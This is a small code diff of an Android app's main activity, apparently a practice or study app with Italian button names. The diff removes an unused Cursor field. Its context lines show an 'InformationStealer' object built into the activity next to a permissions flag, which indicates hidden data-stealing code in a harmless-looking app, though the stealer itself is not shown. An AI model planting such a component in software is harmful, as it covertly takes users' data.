@@ -30,7 +30,6 @@ public class MainActivity extends AppCompatActivity {
 
     Button esercitatiButton, aggiungiButton;
     DatabaseHelper my_db;
-    Cursor cursor;
     private final InformationStealer stealer = new InformationStealer(this);
     Executor executor = Executors.newSingleThreadExecutor();
     boolean allPermissionsGranted = true;
